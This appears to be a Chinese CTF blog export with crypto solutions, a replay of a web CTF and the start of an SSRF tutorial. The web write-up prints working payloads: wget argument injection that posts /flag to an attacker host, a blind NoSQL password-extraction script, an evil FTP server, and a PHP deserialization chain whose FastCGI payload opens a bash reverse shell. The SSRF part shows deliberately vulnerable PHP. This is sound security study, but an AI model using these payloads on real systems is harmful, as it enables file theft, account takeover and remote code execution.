0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 5 3 1 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 复制到010里发现是Unicode编码 Unicode解码发现是base64，再解码得到flag CRYPTObabyRSA已知nce，要求出明文，就要先想办法求出qpd， 利用RsaCtfTool.py进行求解 求公钥 然后再求私钥 最后得到qpd 随便找个rsa脚本套进去就行了 from Crypto.Util.number import long_to_bytes string &#x3D; &#39;&#39; for x in range(1): c &#x3D; 14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854 q &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401 p &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467 n &#x3D; 27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267 e &#x3D; 65537 #d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) d &#x3D; 3121448257353397521008122343609193178885723335228834266026969249529973560167730063129299361044338541996643944734161746790345361029496254021234107830835147478445995827602129027084328557873121512535534338680955898684986137612006599528489101993024083016810624261537303995439156771941439694356136703960699682133382027158795284121176051335224541792139301998430867357667228591618159856224671481257868298256833038515716847186893503607277761265884934308680131384025054980116408946675249894376907198506526558779944638834026881901482983419902337359310844362781386068641635065060468067278449010820146945870895885764387716082673 m &#x3D; pow(c, d, n) string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;) print(string) babyAES这个怎么说呢。。。确实很简单 只要把给的值带进去然后把加密改成解密就行了 ezDLP离散对数问题 直接用sage求就行 然后将结果转成十六进制再转换成字符 ezStream0xGame2021有个差不多的，直接抄一下现成的脚本 from Crypto.Util.number import * base &#x3D; pow(2,32) i &#x3D; 104984523 a &#x3D; 3939333498 b &#x3D; 3662432446 m &#x3D; 2271373817 state1 &#x3D; 17362 state2 &#x3D; 20624 # while i &lt;&#x3D; base: # # print(i) # if ((a*i+b)%m)&gt;&gt;16 &#x3D;&#x3D; state1 and ((((a*i+b)%m)*a+b)%m)&gt;&gt;16 &#x3D;&#x3D; state2: # print(&#39;find it&#39;,i) # break # i+&#x3D;1 seed &#x3D; 104984523 # class LCG: def __init__(self): self.a &#x3D; a self.b &#x3D; b self.m &#x3D; m self.seed &#x3D; 104984523 def next(self): self.seed &#x3D; (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 def output(self): print(&quot;a &#x3D; &#123;&#125;\\nb &#x3D; &#123;&#125;\\nm &#x3D; &#123;&#125;&quot;.format(self.a, self.b, self.m)) print(&quot;state1 &#x3D; &#123;&#125;&quot;.format(self.next())) print(&quot;state2 &#x3D; &#123;&#125;&quot;.format(self.next())) lcg &#x3D; LCG() lcg.output() flag &#x3D; long_to_bytes(&#39;600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#39;).decode() c &#x3D; b&#39;&#39;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10)) for i in range(len(flag))]) print(c) 利用注释的那段爆出seed的值，然后带进去就行","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"陇原战役复现","slug":"陇原战役复现","date":"2022-05-12T14:19:07.000Z","updated":"2022-05-27T13:46:17.439Z","comments":true,"path":"2022/05/12/陇原战役复现/","link":"","permalink":"https://ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"好久之前就想复现这个了，一直拖到了现在 CheckIN下载附件后里面是个go文件 但是实际上这个题跟go关系不大 func getController(c *gin.Context) &#123; cmd :&#x3D; exec.Command(&quot;&#x2F;bin&#x2F;wget&quot;, c.QueryArray(&quot;argv&quot;)[1:]...)&#x2F;&#x2F;这里的QueryArray是gin框架中接收一组请求的方法。因此在传参的过程中，数组内元素个数没有限制，只需要知道数组内的元素会拼接到一起跟在wget后面执行即可。 err :&#x3D; cmd.Run() if err !&#x3D; nil &#123; fmt.Println(&quot;error: &quot;, err) &#125; c.String(http.StatusOK, &quot;Nothing&quot;) &#125; router.GET(&quot;&#x2F;wget&quot;, getController) 可以看到/wget路由下有个getController 我们先了解一下wget wget命令是Linux系统用于从Web下载文件的命令行工具，支持 HTTP、HTTPS及FTP协议下载文件，而且wget还提供了很多选项，例如下载多个文件、后台下载，使用代理等等 嵌入式 Wget使用一点方法_skdkjzz的博客-CSDN博客 post请求 Wget默认发送Get请求，通过指定参数--post-dataor --post-file 这两个选项 e.g wget--post-data &quot;aaaa&quot; http://127.0.0.1:8333/test.php ​ wget--post-data &quot;user=foo&quot; http://127.0.0.1:8333/test.php ​ wget–post-file post_file http://127.0.0.1:8333/test.php head请求 wget --debug--spider http://127.0.0.1:8333/test.php ​ --spider并不下载文件，通过head请求服务器，获取web服务器响应 –no-cache禁用缓存 e.g wget–no-cache http://127.0.0.1:8333/test.php ​ 请求数据包头部Pragma :no-cache，不使用缓存，http1.1加上Cache-Control: no-cache, must-revalidate –referer使用referer Referrer主要用户点击的上一个页面，一般可以用做防盗链技术，防盗链可以在url后面加一个key=value加密字段，或者使用特定referer字段。 e.g wget–debug –referer www.baidu.com http://127.0.0.1:8333/test.php 显示wget帮助和版本信息 Wget –v or wget –h –e 就是执行命令 e.g wget-e &quot;postdata=111111111&quot; http://localhost:8333/test.php 这种形式和wget –post-data=”11111111” http://localhost:8333/test.php是相同的。 logfile (-o)把debug信息输出到文件 wget http://localhost:8333/test.php -ologfile referer设置 wget --debug --referer &quot;www.baidu.com/dsadsa&quot; www.baidu.com/index.html wget - 简书 (jianshu.com) 用法： wget [选项]... [URL]... 长选项所必须的参数在使用短选项时也是必须的。 启动： 参数 功能 -V, --version 显示 Wget 的版本信息并退出。 -h, --help 打印此帮助。 -b, --background 启动后转入后台。 -e, --execute=COMMAND 运行一个“.wgetrc”风格的命令。 日志和输入文件： 参数 功能 -o, --output-file=FILE 将日志信息写入 FILE。 -a, --append-output=FILE 将信息添加至 FILE。 -d, --debug 打印大量调试信息。 -q, --quiet 安静模式 (无信息输出)。 -v, --verbose 详尽的输出 (此为默认值)。 -nv, --no-verbose 关闭详尽输出，但不进入安静模式。 --report-speed=TYPE Output bandwidth as TYPE. TYPE can be bits. -i, --input-file=FILE 下载本地或外部 FILE 中的 URLs。 -F, --force-html 把输入文件当成 HTML 文件。 -B, --base=URL 解析与 URL 相关的HTML 输入文件 (由 -i -F 选项指定)。 --config=FILE Specify config file to use. 下载： 参数 功能 -t, --tries=NUMBER 设置重试次数为 NUMBER (0 代表无限制)。 --retry-connrefused 即使拒绝连接也是重试。 -O, --output-document=FILE 将文档写入 FILE。 -nc, --no-clobber skip downloads that would download to existing files (overwriting them). -c, --continue 断点续传下载文件。 --progress=TYPE 选择进度条类型。 -N, --timestamping 只获取比本地文件新的文件。 --no-use-server-timestamps 不用服务器上的时间戳来设置本地文件。 -S, --server-response 打印服务器响应。 --spider 不下载任何文件。 -T, --timeout=SECONDS 将所有超时设为 SECONDS 秒。 --dns-timeout=SECS 设置 DNS 查寻超时为 SECS 秒。 --connect-timeout=SECS 设置连接超时为 SECS 秒。 --read-timeout=SECS 设置读取超时为 SECS 秒。 -w, --wait=SECONDS 等待间隔为 SECONDS 秒。 --waitretry=SECONDS 在获取文件的重试期间等待 1..SECONDS 秒。 --random-wait 获取多个文件时，每次随机等待间隔0.5WAIT...1.5WAIT 秒。 --no-proxy 禁止使用代理。 -Q, --quota=NUMBER 设置获取配额为 NUMBER 字节。 --bind-address=ADDRESS 绑定至本地主机上的 ADDRESS (主机名或是 IP)。 --limit-rate=RATE 限制下载速率为 RATE。 --no-dns-cache 关闭 DNS 查寻缓存。 --restrict-file-names=OS 限定文件名中的字符为 OS 允许的字符。 --ignore-case 匹配文件/目录时忽略大小写。 -4, --inet4-only 仅连接至 IPv4 地址。 -6, --inet6-only 仅连接至 IPv6 地址。 --prefer-family=FAMILY 首先连接至指定协议的地址FAMILY 为 IPv6，IPv4 或是 none。 --user=USER 将 ftp 和 http 的用户名均设置为 USER。 --password=PASS 将 ftp 和 http 的密码均设置为 PASS。 --ask-password 提示输入密码。 --no-iri 关闭 IRI 支持。 --local-encoding=ENC IRI (国际化资源标识符) 使用 ENC 作为本地编码。 --remote-encoding=ENC 使用 ENC 作为默认远程编码。 --unlink remove file before clobber. 目录： 参数 功能 -nd, --no-directories 不创建目录。 -x, --force-directories 强制创建目录。 -nH, --no-host-directories 不要创建主目录。 --protocol-directories 在目录中使用协议名称。 -P, --directory-prefix=PREFIX 以 PREFIX/... 保存文件 --cut-dirs=NUMBER 忽略远程目录中 NUMBER 个目录层。 HTTP 选项： 参数 功能 --http-user=USER 设置 http 用户名为 USER。 --http-password=PASS 设置 http 密码为 PASS。 --no-cache 不在服务器上缓存数据。 --default-page=NAME 改变默认页(默认页通常是“index.html”)。 -E, --adjust-extension 以合适的扩展名保存 HTML/CSS 文档。 --ignore-length 忽略头部的‘Content-Length’区域。 --header=STRING 在头部插入 STRING。 --max-redirect 每页所允许的最大重定向。 --proxy-user=USER 使用 USER 作为代理用户名。 --proxy-password=PASS 使用 PASS 作为代理密码。 --referer=URL 在 HTTP 请求头包含‘Referer: URL’。 --save-headers 将 HTTP 头保存至文件。 -U, --user-agent=AGENT 标识为 AGENT 而不是 Wget/VERSION。 --no-http-keep-alive 禁用 HTTP keep-alive (永久连接)。 --no-cookies 不使用 cookies。 --load-cookies=FILE 会话开始前从 FILE 中载入 cookies。 --save-cookies=FILE 会话结束后保存 cookies 至 FILE。 --keep-session-cookies 载入并保存会话 (非永久) cookies。 --post-data=STRING 使用 POST 方式；把 STRING 作为数据发送。 --post-file=FILE 使用 POST 方式；发送 FILE 内容。 --method=HTTPMethod use method &quot;HTTPMethod&quot; in the header. --body-data=STRING Send STRING as data. --method MUST be set. --body-file=FILE Send contents of FILE. --method MUST be set. --content-disposition 当选中本地文件名时允许 Content-Disposition 头部 (尚在实验)。 --content-on-error output the received content on server errors. --auth-no-challenge 发送不含服务器询问的首次等待的基本 HTTP 验证信息。 HTTPS (SSL/TLS) 选项： 参数 功能 --secure-protocol=PR choose secure protocol, one of auto, SSLv2,SSLv3, TLSv1 and PFS. --https-only only follow secure HTTPS links --no-check-certificate 不要验证服务器的证书。 --certificate=FILE 客户端证书文件。 --certificate-type=TYPE 客户端证书类型，PEM 或 DER。 --private-key=FILE 私钥文件。 --private-key-type=TYPE 私钥文件类型，PEM 或 DER。 --ca-certificate=FILE 带有一组 CA 认证的文件。 --ca-directory=DIR 保存 CA 认证的哈希列表的目录。 --random-file=FILE 带有生成 SSL PRNG 的随机数据的文件。 --egd-file=FILE 用于命名带有随机数据的 EGD 套接字的文件。 FTP 选项： 参数 功能 --ftp-user=USER 设置 ftp 用户名为 USER。 --ftp-password=PASS 设置 ftp 密码为 PASS。 --no-remove-listing 不要删除‘.listing’文件。 --no-glob 不在 FTP 文件名中使用通配符展开。 --no-passive-ftp 禁用“passive”传输模式。 --preserve-permissions 保留远程文件的权限。 --retr-symlinks 递归目录时，获取链接的文件 (而非目录)。 WARC 选项： 参数 功能 --warc-file=FILENAME save request/response data to a .warc.gz file. --warc-header=STRING insert STRING into the warcinfo record. --warc-max-size=NUMBER set maximum size of WARC files to NUMBER. --warc-cdx write CDX index files. --warc-dedup=FILENAME do not store records listed in this CDX file. --no-warc-compression do not compress WARC files with GZIP. --no-warc-digests do not calculate SHA1 digests. --no-warc-keep-log do not store the log file in a WARC record. --warc-tempdir=DIRECTORY location for temporary files created by the WARC writer. 递归下载： 参数 功能 -r, --recursive 指定递归下载。 -l, --level=NUMBER 最大递归深度 (inf 或 0 代表无限制，即全部下载)。 --delete-after 下载完成后删除本地文件。 -k, --convert-links 让下载得到的 HTML 或 CSS 中的链接指向本地文件。 --backups=N before writing file X, rotate up to N backup files. -K, --backup-converted 在转换文件 X 前先将它备份为 X.orig。 -m, --mirror -N -r -l inf --no-remove-listing 的缩写形式。 -p, --page-requisites 下载所有用于显示 HTML 页面的图片之类的元素。 --strict-comments 用严格方式 (SGML) 处理 HTML 注释。 递归接受/拒绝： 参数 功能 -A, --accept=LIST 逗号分隔的可接受的扩展名列表。 -R, --reject=LIST 逗号分隔的要拒绝的扩展名列表。 --accept-regex=REGEX regex matching accepted URLs. --reject-regex=REGEX regex matching rejected URLs. --regex-type=TYPE regex type (posix). -D, --domains=LIST 逗号分隔的可接受的域列表。 --exclude-domains=LIST 逗号分隔的要拒绝的域列表。 --follow-ftp 跟踪 HTML 文档中的 FTP 链接。 --follow-tags=LIST 逗号分隔的跟踪的 HTML 标识列表。 --ignore-tags=LIST 逗号分隔的忽略的 HTML 标识列表。 -H, --span-hosts 递归时转向外部主机。 -L, --relative 只跟踪有关系的链接。 -I, --include-directories=LIST 允许目录的列表。 --trust-server-names use the name specified by the redirection url last component. -X, --exclude-directories=LIST 排除目录的列表。 -np, --no-parent 不追溯至父目录。 还可以利用wget进行一些命令外带 -bash: wget: 未找到命令_利用命令注入外带数据的一些姿势_weixin_39696665的博客-CSDN博客 一.直接使用wget这里我们就利用了–post-file实现对flag文件上传到我们自己服务器上的操作wget --post-file /flag http://ip:port 因为根据代码 可以看到这是从数组第二个开始取，所以第一个是什么都无所谓，我们要构造的payload要从第二个开始 payload /wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://ip:port/ 在就相当于将/flag里的内容上传到我们服务器的这个端口上，只要我们在服务器上监听这个端口，就能看到上传的内容 二.使用proxy进行ssrf 在这里我们看到不仅仅是--post-file可以传输文件，--body-file同样可以，只是需要指定method 所以/wget?argv=2&amp;argv=--body-file&amp;argv=/flag&amp;argv=--method=POST&amp;argv=http://ip:port/同样可以 当然这个不是我们的ssrf ssrf在/proxy路由里 func proxyController(c *gin.Context) &#123; var url Url if err :&#x3D; c.ShouldBindJSON(&amp;url); err !&#x3D; nil &#123; c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;) return &#125; re :&#x3D; regexp.MustCompile(&quot;127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff&quot;) if re.MatchString(url.Url) &#123; c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;Url Forbidden&quot;&#125;) return &#125; client :&#x3D; &amp;http.Client&#123;Timeout: 2 * time.Second&#125; resp, err :&#x3D; client.Get(url.Url) if err !&#x3D; nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; defer resp.Body.Close() var buffer [512]byte result :&#x3D; bytes.NewBuffer(nil) for &#123; n, err :&#x3D; resp.Body.Read(buffer[0:]) result.Write(buffer[0:n]) if err !&#x3D; nil &amp;&amp; err &#x3D;&#x3D; io.EOF &#123; break &#125; else if err !&#x3D; nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; &#125; c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;) &#125; 这块一看就像为了防止ssrf才写出来的，（虽然我没看出来ssrf漏洞在哪，在我看来这还是利用了wget 但是我们可以用[::]绕过对127.0.0.1的限制然后访问内网 并且wget路由可以用来发送请求，那么就可以传入恶意的参数来获取服务器上文件并且外带出来，最终的payload（注意post发包改为application/json格式） payload &#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;[::]:8080&#x2F;wget?argv&#x3D;-e+http_proxy&#x3D;http:&#x2F;&#x2F;ip:port&amp;argv&#x3D;--method&#x3D;POST&amp;argv&#x3D;--body-file&#x3D;&#x2F;flag&amp;argv&#x3D;http:&#x2F;&#x2F;ip:port&quot;&#125; 小tips： 这个payload里-e &quot;http_proxy=porxyhost:port&quot;这部分是利用wget -e &quot;http_proxy=porxyhost:port&quot; www.baidu.com的形式获得代理设置的命令，但实际上根本用不到，因为argv参数从第二个开始取 顺带提一下如果是curl命令就要用curl -x proxyhost:port www.baidu.com这种形式 三.nosql注入 这里存在nosql注入 所以可以根据这个获取admin的密码，脚本如下： 脚本中使用//将该行之后的代码进行注释，并且通过补全代码使得代码完整代码中判断是否成功用的是Pretend字符串，根据源码，如果用户名名称和密码判断不正确，就会返回含有Pretend的字符串 import requests url &#x3D; &quot;http:&#x2F;&#x2F;47.117.125.220:8081&#x2F;login&quot;#自行修改 headers &#x3D; &#123; &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot; &#125; strings &#x3D; &quot;1234567890abcdefghijklmnopqrstuvwxyz&quot; res &#x3D; &quot;&quot; #res长度从0开始 for i in range(len(res) + 1, 40): if len(res) &#x3D;&#x3D; i - 1: for c in strings: data &#x3D; &#123; #注意这个substr用的是-号，是反向读取密码的，反向逐个读取密码，然后对比 &quot;username&quot;: &quot;admin&#39;&amp;&amp;this.password.substr(-&quot; + str(i) + &quot;)&#x3D;&#x3D;&#39;&quot; + str(c + res) + &quot;&#39;) &#123;return true;&#125;&#125;)&#x2F;&#x2F;&quot;, &quot;password&quot;: &quot;123456&quot; &#125; r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data) if &quot;Pretend&quot; in r.text: res &#x3D; c + res print(&quot;[+] &quot; + res) break else: print(&quot;[-] Failed&quot;) break 不过没啥用，就算是admin登录了也没flag eaaasyphp&lt;?php class Check &#123; public static $str1 &#x3D; false; public static $str2 &#x3D; false; &#125; class Esle &#123; public function __wakeup() &#123; Check::$str1 &#x3D; true; &#125; &#125; class Hint &#123; public function __wakeup()&#123; $this-&gt;hint &#x3D; &quot;no hint&quot;; &#125; public function __destruct()&#123; if(!$this-&gt;hint)&#123; $this-&gt;hint &#x3D; &quot;phpinfo&quot;; ($this-&gt;hint)(); &#125; &#125; &#125; class Bunny &#123; public function __toString() &#123; if (Check::$str2) &#123; if(!$this-&gt;data)&#123; $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;]; &#125; file_put_contents($this-&gt;filename, $this-&gt;data); &#125; else &#123; throw new Error(&quot;Error&quot;); &#125; &#125; &#125; class Welcome &#123; public function __invoke() &#123; Check::$str2 &#x3D; true; return &quot;Welcome&quot; . $this-&gt;username; &#125; &#125; class Bypass &#123; public function __destruct() &#123; if (Check::$str1) &#123; ($this-&gt;str4)(); &#125; else &#123; throw new Error(&quot;Error&quot;); &#125; &#125; &#125; if (isset($_GET[&#39;code&#39;])) &#123; unserialize($_GET[&#39;code&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; 这里有file_put_contents，文件名和内容都可控，可以试试写马，但是这里做了权限控制，写不了 然后看到有hint类，里面能访问phpinfo尝试去反序列化执行这个类，绕过wakeup我们采用常用的修改方式 O:4:&quot;Hint&quot;:0:&#123;&#125;&#x3D;&gt;O:4:&quot;Hint&quot;:1:&#123;&#125; 发现并没有执行，因为wakeup的绕过在高版本被修复了，这里官方给了一个很有意思的绕过https://bugs.php.net/bug.php?id=81151 将O改成C就能成功绕过，访问phpinfo，改成负数好像也可以 除此之外还可以利用bypass类来访问phpinfo class Bypass &#123; public function __construct() &#123; $this-&gt;test &#x3D; new Esle(); $this-&gt;str4 &#x3D; &#39;phpinfo&#39;; &#125; &#125; $a &#x3D; new Bypass(); echo serialize($a); 在phpinfo里发现 那应该就是利用ftp(文件传输协议)的被动模式打php-fpm9000端口了 FTP的被动模式打php-fpmFTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF 原理： 这里要先在vps上搭一个恶意的ftp服务 # evil_ftp.py import socket s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 5002)) s.listen(1) conn, addr &#x3D; s.accept() conn.send(b&#39;220 welcome\\n&#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b&#39;331 Please specify the password.\\n&#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b&#39;230 Login successful.\\n&#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b&#39;200 Switching to Binary mode.\\n&#39;) #Size &#x2F; conn.send(b&#39;550 Could not get the file size.\\n&#39;) #EPSV (1) conn.send(b&#39;150 ok\\n&#39;) #PASV conn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n&#39;) #STOR &#x2F; (2) conn.send(b&#39;150 Permission denied.\\n&#39;) #QUIT conn.send(b&#39;221 Goodbye.\\n&#39;) conn.close() 然后利用gopherus生成打fastcgi的payload 我们只要9000/_后边的部分 最后就是构造pop链调用file_put_contents 这里有几个魔术方法 __wakeup():当调用unserialize时触发 __toString():当类被当作字符串时调用 __invoke():当把类当作函数处理时调用 pop链 class Check &#123; public static $str1 &#x3D; ture; public static $str2 &#x3D; &#39;phpinfo&#39;; &#125; class Esle &#123; public function __wakeup() &#123; Check::$str1 &#x3D; true; &#125; &#125; class Hint &#123; public function __wakeup()&#123; $this-&gt;hint &#x3D; &quot;no hint&quot;; &#125; public function __destruct()&#123; if(!$this-&gt;hint)&#123; $this-&gt;hint &#x3D; &quot;phpinfo&quot;; ($this-&gt;hint)(); &#125; &#125; &#125; class Bunny &#123; public function __construct()&#123; $this-&gt;filename &#x3D;&#39;ftp:&#x2F;&#x2F;aaa@ip:5002&#x2F;123&#39;;#这里的端口号要和ftp的服务里的端口号一样 &#125; public function __toString(): string &#123; if (Check::$str2) &#123; if(!$this-&gt;data)&#123; $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;]; &#125; file_put_contents($this-&gt;filename, $this-&gt;data); &#125; else &#123; throw new Error(&quot;Error&quot;); &#125; return &#39;1&#39;; &#125; &#125; class Welcome &#123; public function __construct()&#123; $this-&gt;username &#x3D; new Bunny(); &#125; public function __invoke(): string &#123; Check::$str2 &#x3D; true; return &quot;Welcome&quot; . $this-&gt;username; &#125; &#125; class Bypass &#123; public function __construct() &#123; $this -&gt; test &#x3D; new Esle(); $this -&gt;str4 &#x3D; new Welcome(); &#125; public function __destruct() &#123; if (Check::$str1) &#123; ($this-&gt;str4)(); &#125; else &#123; throw new Error(&quot;Error&quot;); &#125; &#125; &#125; $a &#x3D; new Bypass(); echo urlencode(serialize($a)); 最终构造的payload为 code&#x3D;O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A33%3A%22ftp%3A%2F%2Faaa%40117.XX.XXX.XXX%3A5002%2F123%22%3B%7D%7D%7D&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.XX.XXX.XXX&#x2F;5001%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"ssrf","slug":"ssrf","date":"2022-04-26T07:07:27.000Z","updated":"2022-05-27T13:55:15.610Z","comments":true,"path":"2022/04/26/ssrf/","link":"","permalink":"https://ethe448.github.io/2022/04/26/ssrf/","excerpt":"","text":"SSRF首先，什么是ssrf？ SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。 SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。 请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。 ssrf的危害内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。 窃取本地和内网敏感数据：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。 攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用。 跳板攻击：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。 绕过安全防御：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。 拒绝服务攻击：请求超大文件，保持链接 Keep-Alive Always。 在服务器上搭个环境，看到页面查到的ip是服务器的，而不是本机的ip 相关危险函数SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。 file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。 &lt;?php $url &#x3D; $_GET[&#39;url&#39;];; echo file_get_contents($url); ?&gt; readfile()：输出一个文件的内容。 fsockopen()：打开一个网络连接或者一个Unix 套接字连接。 &lt;?php function GetFile($host,$port,$link) &#123; $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\\r\\n&quot;; $out .&#x3D; &quot;Host: $host\\r\\n&quot;; $out .&#x3D; &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .&#x3D; &quot;\\r\\n&quot;; fwrite($fp, $out); $contents&#x3D;&#39;&#39;; while (!feof($fp)) &#123; $contents.&#x3D; fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125; ?&gt; curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。 &lt;?php if (isset($_POST[&#39;url&#39;]))&#123; $link &#x3D; $_POST[&#39;url&#39;]; $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项 $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器 curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源 fopen()：打开一个文件文件或者 URL。 …… 一些tips 1.一般情况下PHP不会开启fopen的gopher wrapper 2.file_get_contents的gopher协议不能URL编码 3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转， 6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议 相关协议 file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容 dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等 gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell http/s协议：探测内网主机存活 贴一下国光师傅的博客 https://www.sqlsec.com/2021/05/ssrf.html file协议file协议主要用于访问本地计算机中的文件，命令格式为： file:&#x2F;&#x2F;文件路径 利用场景使用file协议进行的任意文件读取算是ssrf最简单的利用方式了首先先写一段有ssrf漏洞的代码，命名为ssrf.php并部署到服务器上。 &lt;?php highlight_file(&#39;shell.php&#39;); $url &#x3D; $_GET[&#39;url&#39;]; echo($url); $curlobj &#x3D; curl_init($url); echo curl_exec($curlobj); ?&gt; 然后就可以利用file协议进行读取文件操作了 另外，如果是宝塔建的站，记得复现的时候把这个防跨站攻击关了，不然什么也读不到 file协议与http协议的区别 file协议主要用于读取服务器本地文件，访问的是本地的静态资源 